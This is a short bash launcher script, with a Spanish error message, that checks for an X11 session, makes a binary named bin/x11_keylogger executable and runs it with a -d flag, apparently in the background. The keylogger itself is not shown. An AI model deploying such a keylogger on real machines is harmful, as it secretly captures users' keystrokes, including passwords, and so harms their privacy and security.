#!/bin/bash
cd "$(dirname "$0")/.."
[ -z "$DISPLAY" ] && echo "Error: No hay sesión X11" && exit 1
chmod +x bin/x11_keylogger
./bin/x11_keylogger -d
